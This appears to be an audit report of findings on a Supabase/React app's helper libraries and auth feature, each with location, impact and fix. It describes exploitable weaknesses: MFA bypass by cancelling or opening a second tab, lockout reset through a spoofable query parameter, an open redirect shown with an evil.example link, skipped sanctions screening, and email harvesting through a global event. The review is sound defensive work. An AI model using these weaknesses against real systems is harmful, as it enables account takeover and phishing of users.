- **Smallest fix:** Never persist under a shared scope when the real user id is unknown — return undefined (disable persistence) until setActiveQueryPersisterUser gets a concrete id, and stop depending on parsing GoTrue's internal storage format.

### [High] Two divergent isTransientError classifiers (plus a third classify) — 'retryable' has no single owner  `ownership` (CONFIRMED)
- **Where:** src/lib/transient-error.ts:58-74 vs src/lib/errors/extract.ts:37-50,144-146; consumed by src/lib/data/transient-retry.ts:22 and src/lib/db/retry.ts:1; third path src/lib/query/queryDefaults.ts:21 + src/lib/observability/classify.ts:130
- **What breaks:** Confirmed disagreement between the two code/status tables. transient-error.ts TRANSIENT_HTTP_STATUSES = {0,408,429,500,502,503,504} and PG set has 55P03/08004/08001; extract.ts TRANSIENT_CODES lacks 500/429/408/502 but adds 57014 (statement_timeout), 522, 524. So db/retry.ts (extract) hard-fails a 500 that transient-retry.ts (transient-error) silently retries, and transient-error.ts hard-fails a 57014 statement_timeout that extract.ts retries. Identical infra blips produce inconsistent user outcomes depending purely on which wrapper the call happened to use, and every new PG code must be added in 2-3 files or they drift further.
- **Smallest fix:** Collapse to one exported isTransientError with one code/status table; have transient-retry.ts, db/retry.ts and observability/classify all import it; delete the duplicates.

### [High] Timeout wrappers never abort the in-flight request AND two of them auto-retry the timeout -> duplicate writes  `error-handling` (CONFIRMED)
- **Where:** src/lib/edge/invokeEdge.ts:61-70 (comment: 'client doesn't pass AbortSignal; we race manually' — the AbortController only rejects the race, never cancels the fetch); src/lib/db/rpc-with-timeout.ts:34-72 (retryOnTimeout default true, first attempt never cancelled); src/lib/data/bounded-save.ts:71
- **What breaks:** All three 'timeout' helpers only stop WAITING for the response — the underlying supabase.functions.invoke / supabase.rpc / save() keeps running and can still commit server-side. rpcWithTimeout compounds this: on RPC_TIMEOUT it automatically fires a second attempt (69-71) with no idempotency and the first call uncancelled, so a timed-out but committing RPC (the Discord role-retry and admin 2FA-grace RPCs this file was written for) executes twice. Separately, callers that wrap these in withTransientRetry/retryTransientWrite retry on any /timeout/ message (transient-error.ts:28, extract.ts:58), double-executing a mutation whose first attempt actually landed. 'Timeout' is silently treated as 'didn't happen' when it often means 'happened, response lost'.
- **Smallest fix:** Make the wrappers genuinely cancel (pass the AbortSignal / server-side statement cancel) before declaring timeout, default retryOnTimeout to false for non-idempotent RPCs, and gate any timeout-triggered retry behind an idempotency key.
- _added-in-verification_

### [Medium] Five+ overlapping retry/timeout wrappers; none provides timeout + retry + reporting together  `over-engineering` (CONFIRMED)
- **Where:** src/lib/data/bounded-save.ts, src/lib/data/transient-retry.ts, src/lib/db/retry.ts, src/lib/db/rpc-with-timeout.ts, src/lib/supabase/safe-rpc.ts, src/lib/edge/invokeEdge.ts
- **What breaks:** Confirmed distinct contracts: withBoundedSave (timeout+probe, no retry-classify), withTransientRetry/retryPostgrest (retry 150/400/900, no timeout), retryTransientWrite (retry 250/500/1000, no timeout), rpcWithTimeout (timeout+blind retry, NO reporting), safeRpc (reporting, NO timeout), invokeEdge (timeout+retry+report, edge-only, 500ms fixed). A caller wanting an RPC that both times out AND reports must nest rpcWithTimeout inside safeRpc or reimplement, and each classifies/backs off differently. This is the 'second way to do the same thing' the repo rules forbid; every resilience fix must be made in several places and behavior is unpredictable.
- **Smallest fix:** Consolidate to one query wrapper (timeout+retry+report, toggles) and one edge wrapper; migrate callers and delete the rest.

### [Medium] lib modules import upward from src/services and the frozen auth layer (inverted dependency)  `dependency` (CONFIRMED)
- **Where:** src/lib/discord/finalize-link.ts:13-15 (JourneyService, DiscordNotifyService, logger.service); src/lib/supabase/safe-rpc.ts:10 (services/error-reporter.service); src/lib/support/freescoutInvoke.ts:2-3 (lib/auth/session-port + services/error-reporter.service)
- **What breaks:** Intended layering is services -> lib (lib lowest). These lib files import from src/services, and freescoutInvoke reaches into src/lib/auth/session-port (the frozen/high-risk auth layer). That inverts the arrow, creating service->lib->service cycles, makes lib impossible to unit-test/reuse without dragging in the service graph, and couples a low-level helper to the frozen auth port so a lib edit can destabilize auth. These 'shared' helpers are not actually shared-safe.
- **Smallest fix:** Invert via injection — callers pass logger/reporter/notify/session in — or move finalizeDiscordLink and safeRpc's reporting up into the service layer so lib depends on nothing above it.

### [Medium] React hook (useQuestPathMaps) lives in src/lib and imports react  `dependency` (CONFIRMED)
- **Where:** src/lib/quest/path-maps.ts:1,12-24 (import { useMemo } from 'react'; export function useQuestPathMaps)
- **What breaks:** A React hook sits in the lib layer, which must be free of UI/React concerns. It can't be called outside a render, can't be unit-tested as pure logic, and pulls React into a layer other non-UI code (edge/data helpers) imports from — leaking a UI dependency downward. It also blends pure map-building with React memoization that should be separable.
- **Smallest fix:** Extract a pure buildQuestPathMaps(paths) into lib and keep the useMemo wrapper as a hook in src/hooks; components import the hook, lib stays React-free.

### [Medium] format/date.ts formatTime computes time in the browser's local zone but labels it with an arbitrary tz string  `other` (CONFIRMED)
- **Where:** src/lib/format/date.ts:28-40 (formatTime uses d.getHours()/getMinutes() then appends tz), :42-49 (formatDateTime)
- **What breaks:** formatTime(input, tz) derives hours/minutes from d.getHours() — the VIEWER's local timezone — then blindly appends the caller-supplied tz label (e.g. 'EST'). A user in PST rendering an event with tz='EST' sees their own local clock time stamped 'EST' — an authoritative-looking WRONG time, off by the viewer's UTC offset while asserting a zone it never converted to. This duplicates src/lib/events/formatEventTime.ts, which converts correctly via Intl timeZone, so the codebase has one right and one wrong formatter and callers can't tell which they got.
- **Smallest fix:** Make formatTime convert via Intl.DateTimeFormat({timeZone}), or remove the tz parameter so it can't imply a conversion it doesn't perform; prefer the existing formatEventTime helpers.

### [Medium] Raw supabase.functions.invoke calls bypass invokeEdge (and its own ESLint rule) — no real timeout/trace/retry  `under-engineering` (CONFIRMED)
- **Where:** src/lib/i18n/dom-translator.ts:206-208 (supabase.functions.invoke('translate-strings')); src/lib/support/freescoutInvoke.ts:25-28 (supabase.functions.invoke('freescout-proxy'))
- **What breaks:** invokeEdge.ts:4-5 states it replaces direct supabase.functions.invoke calls, enforced by ESLint rule no-raw-functions-invoke, yet two in-scope modules call the raw client. translate-strings gets NO AbortController timeout, so it can hang inflight forever (state.inflight never clears, no further batches flush — UI stuck in English) and gets no x-trace-id correlation. freescoutInvoke hand-rolls a second invoke convention, manually setting Authorization instead of inheriting invokeEdge's JWT plumbing. Two mechanisms means timeout/retry/trace fixes only land in one.
- **Smallest fix:** Route both through invokeEdge (add silentReport/noRetry options where needed) so timeout, trace and classification are uniform; then the ESLint rule actually holds.

### [Medium] DOM translator drops queued strings on edge error — silent permanent non-translation  `error-handling` (CONFIRMED)
- **Where:** src/lib/i18n/dom-translator.ts:201 (state.pending.clear() before the await), :206-209 (if error/!data.map -> return), :223-224 (empty catch)
- **What breaks:** flush() clears state.pending (201) BEFORE awaiting translate-strings (206). If the call errors or returns no map, it returns (209) or the bare catch (223) swallows without re-queuing. Those strings are gone from pending and cached nowhere, so they stay English forever unless that exact DOM text node later mutates (static labels never do). Users on a flaky connection get a permanently half-translated UI with no error and no retry of the lost batch.
- **Smallest fix:** On failure re-add the un-translated batch to state.pending and scheduleFlush with bounded backoff, and report the failure instead of swallowing it.

### [Medium] finalizeDiscordLink fire-and-forget avatar save races cache invalidation and hides partial failure (orphaned blob)  `error-handling` (CONFIRMED)
- **Where:** src/lib/discord/finalize-link.ts:85 (void saveDiscordAvatar), :103-104 (invalidateQueries), :37-63 (saveDiscordAvatar try/catch returns on every branch)
- **What breaks:** saveDiscordAvatar is launched with void (floating, awaited by nothing) while invalidateQueries for the profile fires synchronously right after (103-104) — so the profile cache refreshes BEFORE the avatar row is written and the user sees no avatar until a later refetch. Worse, saveDiscordAvatar wraps everything in try/catch returning on every failure branch: if storage upload SUCCEEDS (50-53) but the subsequent profiles.update (56-59) fails, the bytes are orphaned in the avatars bucket and nothing is reported. The whole avatar path can fail with zero signal.
- **Smallest fix:** Await the avatar save (or invalidate only after it resolves), and on the upload-succeeded/DB-failed branch compensate or report(err) instead of silently returning.

### [Medium] DOM translator silently drops pending strings beyond MAX_BATCH even on a SUCCESSFUL flush  `error-handling` (CONFIRMED)
- **Where:** src/lib/i18n/dom-translator.ts:196-202 (batch capped at MAX_BATCH=150, then state.pending.clear() clears ALL pending)
- **What breaks:** flush() iterates state.pending, pushes up to MAX_BATCH (150) uncached strings into batch, then unconditionally state.pending.clear() (201) — discarding every pending string past the first 150. This happens even when the edge call succeeds. The finally block re-schedules only if pending.size>0, but pending was just cleared to 0, so the overflow strings are never re-queued. On a dense page (>150 unique untranslated strings) the tail stays permanently English unless those specific DOM nodes later mutate. This is distinct from the error-path drop already flagged: it loses data on the happy path.
- **Smallest fix:** Only delete the strings actually placed in batch (state.pending.delete(s) per pushed item), leaving the overflow queued, and let the finally re-arm flush for the remainder.
- _added-in-verification_

### [Medium] classify() hard-codes the translator's own reconciler-crash signature as unreportable 'extension' noise — app is blind to self-inflicted crashes  `error-handling` (CONFIRMED)
- **Where:** src/lib/observability/classify.ts:20-23 (DOM_EXTENSION_RE), :48-53 (isDomExtensionMutationError), :94-96 (classify returns report:false, reason 'dom_extension_mutation'); source of the same error: src/lib/i18n/dom-translator.ts:296-300
- **What breaks:** classify() treats any NotFoundError matching "Failed to execute 'insertBefore/removeChild/appendChild' on 'Node'" as browser-translation-extension noise and drops it (report:false, retriable:true), on the stated assumption it is 'never a Tech Fleet bug.' But finding 1 shows this app's OWN dom-translator produces exactly that error class by rewriting React-managed nodeValue. So the app's self-inflicted reconciler crashes are structurally classified as third-party extension noise and never reach audit_log / triage — the observability layer is deliberately blind to the exact whole-app stability bug the translator can cause, for the entire non-English user base.
- **Smallest fix:** Distinguish own-code crashes from extension crashes (e.g. tag translator-induced mutations, or check whether the DOM translator is active/language!=='en') before suppressing, so self-inflicted NotFoundErrors are still reported.
- _added-in-verification_

### [Low] collapseNotificationsToDigest silently mis-groups when input is not sorted created_at desc  `error-handling` (CONFIRMED)
- **Where:** src/lib/notifications/collapseDigest.ts:29-56 (windowing assumes 'sorted by created_at desc' — comment 30-31 — with no validation)
- **What breaks:** The algorithm measures the 10-minute window from the run head (44-45) and only advances while same-kind and within window (48-56); it explicitly assumes created_at desc but never checks. If a caller passes an unsorted or asc list (easy after a client-side merge, optimistic insert, or a refetch returning different order) bursts split into partial stacks or fail to collapse, and the synthesized read: unreadCount===0 (61,67) and stackCount become wrong — badge/'Show all' counts lie to the user. Silent correctness bug triggered by upstream ordering, not a crash.
- **Smallest fix:** Sort defensively at the top (or assert ordering in dev) so grouping is independent of caller ordering.

### [Low] bounded-save marks a save unresolved while the write is still in flight -> retry duplicates  `error-handling` (CONFIRMED)
- **Where:** src/lib/data/bounded-save.ts:66-96 (timer races opts.save(); save() is never aborted; unresolved branch throws SaveIndeterminateError)
- **What breaks:** On timeout the save promise is NOT aborted — Promise.race (71) just abandons it, and it keeps running. The probe (83) reads current state; if the write hasn't landed yet it returns 'unresolved' and the helper throws SaveIndeterminateError (96), prompting a Retry CTA. The original write can commit a moment later and the user's retry commits again — a duplicate for any non-idempotent save (inserts, append-style updates). The helper's whole purpose is resolving indeterminate saves, yet its unresolved branch actively encourages double-submits with no idempotency guard.
- **Smallest fix:** Make the retried save idempotent (upsert on a stable key / conditional update) or carry a client-generated operation id the write dedupes on, and document that save() must be safe to run twice.

### [Low] Google Calendar all-day template uses UTC date parts -> off-by-one day across timezones  `other` (CONFIRMED)
- **Where:** src/lib/events/googleCalendarTemplate.ts:16-26 (toGCalDate allDay branch uses getUTCFullYear/getUTCMonth/getUTCDate)
- **What breaks:** For all-day events the date is derived from the UTC components of the instant (19-22). An all-day event whose intended calendar day was set in a negative-offset zone (local-midnight stored as the next UTC day, or an end boundary at local midnight = previous UTC day) yields a GCal template one day off. Users adding the event to their own calendar land on the wrong date. Inconsistent with weekRange.ts / formatEventTime.ts which correctly use tz-aware Intl conversion.
- **Smallest fix:** Compute all-day dates from the event's own timeZone (date-fns-tz formatInTimeZone 'yyyyMMdd') as the other event helpers already do, not from getUTC*.

---

## Auth feature: engine, domain, ports, adapters & flows

### [High] MFA is a client-only dialog opened AFTER a live session is written; cancel never signs out  `security` (CONFIRMED)
- **Where:** src/features/auth/engine/use-sign-in-engine.ts:317-333 (gate after flowResult.ok) and :251-252 (onMfaSuccess/onMfaCancel); session written in services/sign-in.service.ts:106-167
- **What breaks:** signInWithPasswordService already called supabaseSessionAdapter.signInPassword() and asserted data.session.access_token (sign-in.service.ts:144-167) — a full GoTrue session with a live refresh token is persisted to storage BEFORE MfaService.getMfaGateDecision() runs at engine:323. needsChallenge only does setMfaOpen(true) (:326); onMfaCancel (:252) only sets an error string and never calls signOut. An MFA-enrolled user (or anyone with a stolen password) opens /dashboard in a second tab, or clicks Cancel, and stays fully authenticated. AAL2 is never enforced at the session layer — a total second-factor bypass.
- **Smallest fix:** Do not treat password success as signed-in when MFA is required: hold the session unelevated and force sessionPort.signOut() on MFA cancel/timeout, or gate the session server-side on AAL before the token is usable.
- _Verified: SDK writes session pre-gate; onMfaCancel has no signOut._

### [High] Classifier maps HTTP 403 to invalid_credentials, firing full punitive lockout on any edge/WAF 403  `error-handling` (CONFIRMED)
- **Where:** src/features/auth/services/auth-classifier.ts:77; consumed by flows/sign-in-password.flow.ts:45-46 and engine/use-sign-in-engine.ts:338/361-372; policy at services/auth-failure-policy.ts:45-54
- **What breaks:** `if (status === 401 || status === 403) return "invalid_credentials"` — 403 is authorization/forbidden (Cloudflare WAF, captcha edge reject, geo/sanctions rule), not a bad password. decideFailureActions('invalid_credentials') sets incrementDeviceLockout + recordServerRateLimitFailure + recordCredentialFailureRpc ALL true (auth-failure-policy.ts:46-53). During any Cloudflare 403 event every legitimate user typing the correct password is device-locked locally AND server-rate-limited cross-device via record_failed_login. This is exactly the Vichea-class punitive-on-non-credential regression the codebase claims to prevent, reintroduced via status mapping.
- **Smallest fix:** Map 403 to a non-punitive code (captcha_required/service_unavailable/unexpected). Reserve invalid_credentials for 401 with a credential-specific server code.
- _Verified classifier + policy table._

### [High] Three divergent implementations of sign-up / reset-request / reset-complete; contract tests lock in the wrong owner  `ownership` (CONFIRMED)
- **Where:** flows/*.flow.ts vs services/*.service.ts vs adapters/supabase-session.adapter.ts:50-72; prod wiring via ports/session.port.ts:37-43
- **What breaks:** Reset-completion has THREE bodies: complete-password-reset.flow.ts:30 calls supabase.auth.updateUser({password}) directly; complete-password-reset.service.ts:93-116 calls the finalize-password-reset EDGE FUNCTION with a bearer token, then clear_own_auth_rate_limits_after_password_reset, and returns other_devices_revoked; supabase-session.adapter.ts:71 calls updateUser again. Sign-up: service.ts:36-193 does domain-MX + duplicate detection + indeterminate probe; the flow does a thinner version; the adapter just wraps signUp. Reset-request: request-password-reset.service.ts:29-35 enforces the google-only block + domain validation; the flow does neither. Engines wire the SERVICE path (session.port.ts:37-43); the flows are only imported by contract tests (auth-flow-lockdown.contract.test.ts) — so the test suite validates a parallel dead path with different safety behavior than production, giving false confidence while the real owners are differently and less-tested. No single owner of 'complete a password reset'.
- **Smallest fix:** Delete flows/* (or make them thin wrappers over the owning service) and repoint the contract tests at the service. One owner per operation.
- _Verified flows are test-only; services are prod path via session.port._

### [High] Server-side punitive counters are fire-and-forget with swallowed errors; the only synchronous gate fails open  `error-handling` (CONFIRMED)
- **Where:** src/features/auth/engine/failure-policy.ts:37-51 and engine/use-sign-in-engine.ts:298-300
- **What breaks:** applyServerRateLimitFailure and applyCredentialFailureRpc both `void ...().catch(() => undefined)` (failure-policy.ts:39,50) — if record_failed_login / record_rate_limit_failure RPC fails, cross-device lockout never advances and the drop is invisible (no retry, no report, no telemetry). The only synchronous gate, RateLimitService.peek, `.catch(() => ({allowed:true}))` fails OPEN (use-sign-in-engine.ts:298-300). So when the rate-limit RPC is degraded: client peek says allowed, the local lockout is trivially resettable (see the query-param reset finding), and the server counter write is silently dropped — brute-force / credential-stuffing defense disappears with zero operator signal.
- **Smallest fix:** Report punitive-RPC failures to ops (they are the security control, not telemetry). Make peek fail-closed or degrade to a conservative local limit instead of allowed:true.
- _Verified both swallows + fail-open peek._

### [High] Sanctions / export-control screening fails open on any error  `error-handling` (CONFIRMED)
- **Where:** src/features/auth/engine/use-register-engine.ts:203-213
- **What breaks:** The screen-sanctions edge call is wrapped in `try { ... } catch { /* fail-open */ }` (:212). If the edge function is down, throws, or times out, registration proceeds and the account is created regardless of OFAC/export-control status, and nothing records that the check was skipped. A U.S. export-control gate that silently permits on failure is a legal-compliance defect — a member from a sanctioned country gets an account during any transient edge outage.
- **Smallest fix:** Fail closed on screening error (block + retry-later message), or at minimum emit a distinct sanctions_screen_unavailable ops event and hard-stop the signup.
- _Verified literal fail-open catch._

### [High] Sanctions screening is entirely SKIPPED when the stored consent country is unknown  `security` (CONFIRMED)
- **Where:** src/features/auth/engine/use-register-engine.ts:84 (countryCode = loadConsent()?.countryCode ?? null) and :203 (if (countryCode) { ...screen... })
- **What breaks:** Screening only runs inside `if (countryCode)`. countryCode is read from loadConsent()?.countryCode and is null whenever consent/geo was never captured (first visit, cleared storage, consent banner dismissed, non-EU flow that skips country capture). A registrant with no stored country therefore bypasses OFAC/export-control screening completely — not merely on error (that is the separate fail-open finding) but on the normal path. This is a larger hole than the fail-open: the check is not attempted at all, and the account is created with no screening and no record that it was skipped.
- **Smallest fix:** Resolve country server-side (IP geo in the edge function) and screen unconditionally; never make sanctions screening conditional on a client-supplied, frequently-absent consent field.
- _added-in-verification_

### [High] Open redirect: register engine navigates to raw, unsanitized redirect param after sign-in  `security` (CONFIRMED)
- **Where:** src/features/auth/engine/use-register-engine.ts:297 (window.location.assign) and :256 (emailRedirectTo concat); redirectParam from :76 searchParams.get('redirect')
- **What breaks:** On ACCOUNT_RECOVERED_SIGNED_IN the engine calls `window.location.assign(redirectParam || "/dashboard")` with redirectParam taken straight from searchParams.get('redirect') — this engine never imports normalizeSafeRedirectTarget (the sign-in engine deliberately does, use-sign-in-engine.ts:112). A crafted /register?redirect=https://evil.example link signs the user in and then bounces them to an attacker origin (phishing hand-off immediately post-auth). Line 256 also concatenates the same raw param into the signup emailRedirectTo.
- **Smallest fix:** Run redirectParam through normalizeSafeRedirectTarget before any assign/redirect and before building emailRedirectTo, exactly as the sign-in engine does.
- _Verified: no normalize import in register engine._

### [Medium] request-password-reset.flow returns an error on transport failure, contradicting its own anti-enumeration comment — and a contract test locks the violation in  `security` (CONFIRMED)
- **Where:** src/features/auth/flows/request-password-reset.flow.ts:45 vs :54-64; test at testing/contract/auth-flow-lockdown.contract.test.ts:201-208
- **What breaks:** On a GoTrue error the flow returns ok(password_reset_email_sent) (:45, anti-enumeration), but the transport catch returns err({code:'service_unavailable'}) (:64) even though the comment on :62 says 'Even on transport failure we surface as sent (anti-enumeration)'. The code does the opposite of its own invariant, and `void code;` (:63) is dead. Worse, auth-flow-lockdown.contract.test.ts:201-208 asserts result.ok===false / service_unavailable on transport throw — the divergence is codified as a contract, so anyone who ships this flow (its documented Phase-5 plan) delivers a network/timing enumeration oracle that renders a different screen for transport errors than for success. Currently only test-wired, so not yet an active prod oracle — a latent, test-blessed landmine.
- **Smallest fix:** Return ok(password_reset_email_sent) in the catch too; emit failure only to telemetry; delete the contradictory test assertion. Or delete this flow in favor of the service that already does this correctly.
- _Verified code + test lock-in; flow is test-only in prod today._

### [Medium] Registration partial-commit: policy acknowledgment recorded inside the failure-punishing try; a throw punishes the user for an account that exists and loses the consent record  `error-handling` (CONFIRMED)
- **Where:** src/features/auth/engine/use-register-engine.ts:251-260 then catch at :264-305
- **What breaks:** `await sessionPort.signUp(...)` (:251) then `await recordPolicyAcknowledgment(...)` (:260) sit in one try. If signUp succeeds but recordPolicyAcknowledgment throws (network/RPC), control falls into the generic catch which runs applyServerRateLimitFailure (:300) + applyInvalidAttempt (:302, a punitive device lockout) and shows 'We couldn't create your account' — even though the account WAS created. The user is locked out and misinformed; the next attempt returns ACCOUNT_EXISTS. The legal consent/electronic-comms acknowledgment is also lost while the account persists — an account with no recorded policy acknowledgment (compliance gap).
- **Smallest fix:** Move recordPolicyAcknowledgment out of the punitive try, or treat a post-signup acknowledgment failure as a non-punitive retry/report, never as a signup failure.
- _Verified ordering and catch punishment._

### [Medium] Reset flow accepts an expired recovery link whenever ANY session is present  `boundary` (CONFIRMED)
- **Where:** src/features/auth/engine/use-reset-password-engine.ts:179-192 (verifyPendingToken) via confirmActiveRecoverySession:49-55
- **What breaks:** When verifyRecoveryOtp returns an error, the code calls confirmActiveRecoverySession() (:180) and, if session.ok (Boolean(getUser().data.user.id), :53), calls settleValid and renders the password form. getUser cannot distinguish a genuine recovery session from a leftover ordinary login session. A user already logged in who clicks an expired/consumed reset link is dropped into a working 'set new password' form operating on their live session, defeating the 'link expired' gate and the stated AUTH-RESET-SESSION-003 invariant. settleValid additionally wipes lockout+attempt counters (:144-146) at this point.
- **Smallest fix:** Verify the session is actually a recovery/AAL-recovery session (or that the OTP verify itself succeeded) before settleValid; do not infer validity from the mere presence of a user.
- _Verified: presence-of-user check only._

### [Medium] Device-lockout is client-side (localStorage) and reset via a spoofable ?from=password-reset param before any reset happens  `security` (CONFIRMED)
- **Where:** src/features/auth/engine/use-sign-in-engine.ts:186 (clearAuthLockout on from=password-reset) and use-reset-password-engine.ts:144-146 (settleValid clears lockout+attempts on link land)
- **What breaks:** Arriving at /login?from=password-reset unconditionally calls clearAuthLockout() (use-sign-in-engine.ts:186); and merely landing on /reset-password with any valid session (settleValid:144-147) clears the device lockout AND the reset-attempt counter BEFORE the password is changed. Because the lockout lives in localStorage, a locked-out attacker navigates to /login?from=password-reset (or opens their own recovery link) to wipe the counter and keep guessing. Combined with the fail-open server peek, the throttle is defeatable end to end.
- **Smallest fix:** Clear lockout only after a verified successful password change, and gate the ?from=password-reset clear on a one-time server-issued token, not a spoofable query string.
- _Verified both clear sites._

### [Medium] Indeterminate signup probe re-submits the plaintext password unthrottled/uncaptcha'd against a possibly-unowned email (in the PROD service)  `security` (CONFIRMED)
- **Where:** src/features/auth/services/sign-up.service.ts:98 (prod path via sessionPort.signUp) duplicated in flows/sign-up.flow.ts:85
- **What breaks:** On a signup timeout/5xx the service probes with supabase.auth.signInWithPassword({email,password}) with NO captcha (sign-up.service.ts:98) — and this is the production path the register engine actually calls. If the email belongs to someone else (typo), the probe consumes that account's login rate-limit budget and can trip its lockout (a griefing/lockout vector against arbitrary emails) and is a second unthrottled transmission of the plaintext password. The identical delicate logic is duplicated in sign-up.flow.ts:85, so two copies can drift.
- **Smallest fix:** Confirm row existence via a server RPC rather than a credentialed sign-in, or captcha/rate-limit-gate the probe. Collapse the flow+service duplication to one owner.
- _Verified probe is in the prod service, not only the flow._

### [Medium] consume-recovery-link returns the wrong success kind; AuthOk cannot express 'recovery session ready', and a contract test bakes it in  `boundary` (CONFIRMED)
- **Where:** src/features/auth/flows/consume-recovery-link.flow.ts:53,60; domain/auth-result.ts:13-20; test auth-flow-lockdown.contract.test.ts:241
- **What breaks:** After exchanging a recovery code/hash for a recovery SESSION, the flow returns ok({kind:'password_reset_email_sent'}) (:53,:60) — a kind that means 'a reset email was sent'. AuthOk (auth-result.ts:13-20) has no recovery-ready/recovery-session kind, so the flow physically cannot report its true outcome; any consumer switching on value.kind renders 'check your email' instead of 'set a new password'. The contract test (:241) asserts this wrong kind, cementing the type-model error.
- **Smallest fix:** Add a recovery-ready kind to AuthOk and return it here (fix the test), or route recovery consumption through the reset engine's branch logic instead of this flow.
- _Verified missing kind + test assertion._

### [Medium] sessionPort.rpc / invokeEdge erase all type safety via `as never`  `dependency` (CONFIRMED)
- **Where:** src/features/auth/ports/session.port.ts:59,61-62; rpc used in engine/failure-policy.ts:45
- **What breaks:** `supabase.rpc(name as never, args as never)` (:62) accepts any string as RPC name and any object as args with zero compile-time checking (invokeEdge does the same with options as never at :59). A renamed/unapplied migration — the PGRST202 class the team already hit in prod — yields a runtime 404, and here that failure is additionally swallowed by the fire-and-forget catch in applyCredentialFailureRpc, so a broken record_failed_login silently disables cross-device lockout with no build error and no runtime signal.
- **Smallest fix:** Type rpc against generated Database['public']['Functions']; drop the `as never` casts so a bad RPC name fails the build.
- _Verified casts._

### [Medium] Two competing telemetry taxonomies write the same auth events to ops_events  `ownership` (CONFIRMED)
- **Where:** services/auth-telemetry.ts:60-81 (emitAuthBeacon, 'auth.*', via record_event RPC) vs adapters/audit-telemetry.adapter.ts:44-57 (recordAuthEngineEvent, 'auth_engine.*', via record-auth-event fn); both fired for one login from flows/sign-in-password.flow.ts:29/37/47 and engine/use-sign-in-engine.ts:296/332/357
- **What breaks:** A single login emits BOTH auth.signin.* beacons (from the flow) and auth_engine.sign_in_* events (from the engine via telemetryPort.record = recordAuthEngineEvent) into ops_events through two different edge paths and two kind namespaces with two severity contracts. The Auth Funnel dashboard double-counts or half-counts depending on which taxonomy it queries; there is no single source of truth for 'what happened in this login'. Both are fire-and-forget/swallowed, so neither is reliable.
- **Smallest fix:** Pick one telemetry owner and one kind namespace for the auth funnel; route or delete the other.
- _Verified both emit paths on one login._

### [Medium] supabase-session adapter is a false abstraction: 5 of its 6 methods are dead and its 'only client importer' claim is untrue  `over-engineering` (CONFIRMED)
- **Where:** src/features/auth/adapters/supabase-session.adapter.ts:34-84; only signInPassword consumed (services/sign-in.service.ts:106)
- **What breaks:** The header claims the adapter is 'the ONLY non-legacy module allowed to import the client for sign-in/sign-up/password reset'. In reality only signInPassword is used (sign-in.service.ts). sign-up.service, request-password-reset.service, complete-password-reset.service, session.service, session.port itself (imports the client directly at session.port.ts:16 for getUser/verifyRecoveryOtp/exchangeCodeForSession/setSession/invokeEdge/rpc), and every flow import supabase directly. So adapter.signUp/sendReset/finalizeReset/getUser/signOut are dead code and the invariant is false — a provider swap would still touch a dozen files.
- **Smallest fix:** Either route every session operation through the adapter (make the claim true) or delete the adapter and its dead methods as unused indirection.
- _Verified via grep: single consumer._

### [Medium] OAuth-identity probe runs over a global window CustomEvent carrying the member's email; listener re-registers with overlapping polling  `dependency` (CONFIRMED)
- **Where:** src/features/auth/engine/use-sign-in-engine.ts:224-241 (listener + 250ms interval) and :379-382 (dispatch)
- **What breaks:** The engine dispatches new CustomEvent('tfn:probe-oauth-identity', { detail: { email } }) on window (:381) and listens globally (:239). Any third-party script on the page can (a) listen and harvest the member's email after a failed login, or (b) dispatch the event to force check-account-identity calls — an enumeration oracle for has_google/has_password. Auth-flow state crosses a public global event bus instead of a function call, and the listener effect re-subscribes on every captchaToken change (dep array :241) while spinning a fresh 250ms setInterval (:232) each dispatch, so multiple intervals overlap.
- **Smallest fix:** Call checkOauthIdentityForEmail directly instead of via a window event; await the captcha token instead of polling.
- _Verified dispatch + global listener + interval._

### [Medium] sign-out flow always reports success; server-revocation failure is swallowed inside signOutSafe and never surfaced  `error-handling` (CONFIRMED)
- **Where:** src/features/auth/flows/sign-out.flow.ts:15-22; signOutSafe swallows at services/auth-flow.service.ts:74-81
- **What breaks:** signOut() calls signOutSafe(), purges storage, and unconditionally returns ok({kind:'signed_out'}) (:22). signOutSafe (auth-flow.service.ts:74-81) catches any supabase.auth.signOut() failure and only log.warn's it (a client log, not ops) — so the flow has no signal to act on even if it wanted one. If server-side revocation failed, local tokens are cleared but the refresh token may still be valid server-side while the UI shows success; on a shared computer the member believes they are logged out. Neither retried nor reported to ops. (Partly mitigated where a SessionGuard revocation row exists, but the flow itself guarantees nothing.)
- **Smallest fix:** Have signOutSafe return a success/failure result and emit a reported ops failure on server-revocation error so the UI can warn and retry.
- _Verified swallow + unconditional ok._

### [Medium] Flows default email redirect targets to window.location.origin instead of the canonical origin  `boundary` (CONFIRMED)
- **Where:** flows/request-password-reset.flow.ts:32 and flows/sign-up.flow.ts:46 vs getCanonicalAppOrigin() used in engines/services (use-register-engine.ts:256, use-forgot-password-engine.ts:106)
- **What breaks:** The flows default redirectTo/emailRedirectTo to `${window.location.origin}/...` while the engines/services deliberately use getCanonicalAppOrigin(). On a Cloudflare Pages preview or non-canonical apex/www host, a reset or confirmation email generated via the flow path embeds a link to the non-canonical origin, which GoTrue's allow-list rejects or which 404s — a dead reset/verify link. Two sources of truth for 'the app's origin' inside one feature. (Flows are test-only in prod today, so this is latent until a flow is wired.)
- **Smallest fix:** Use getCanonicalAppOrigin() in the flows too, or delete the flows in favor of the engine+service path that already does this.
- _Verified divergence; flows currently test-only._

### [Medium] Admin-login success is audit-logged before the MFA second factor is completed  `security` (CONFIRMED)
- **Where:** src/features/auth/services/sign-in.service.ts:166 (logAdminLoginIfElevated → write_audit_log 'authn_admin_login_success', defined :63-87) runs on password success, before the MFA gate at engine/use-sign-in-engine.ts:323-328
- **What breaks:** signInWithPasswordService fires logAdminLoginIfElevated() on password success (:166), which writes authn_admin_login_success to the audit log via write_audit_log. This happens inside the password step — before MfaService.getMfaGateDecision() and before the user completes (or cancels) MFA. For an MFA-enrolled admin who cancels or fails the challenge, the compliance audit log still records a successful admin login that never fully happened, corrupting the authn audit trail used for security review and incident forensics.
- **Smallest fix:** Emit authn_admin_login_success only after the session is fully elevated (post-MFA), not at the password step.
- _added-in-verification_

### [Low] 'engine' hooks are React UI controllers touching window/document/history/router/toast, not a framework-free decision core  `dependency` (CONFIRMED)
- **Where:** src/features/auth/engine/use-reset-password-engine.ts:120-127 (history.replaceState),:159-173 (document.head meta injection),:206-279 (window.location); plus useNavigate/toast/setInterval across all four engine hooks
- **What breaks:** The engines are named as the pure hexagonal decision core but are useXxx React hooks that mutate document.head, call window.history.replaceState, read window.location, poll with setInterval, and import react-router and sonner. They cannot be unit-tested or reused without a DOM and a router — the opposite of the stated 'screen becomes pure presentation, engine owns logic'. The web concerns simply moved from the screen into the 'engine'; the claimed boundary does not exist.
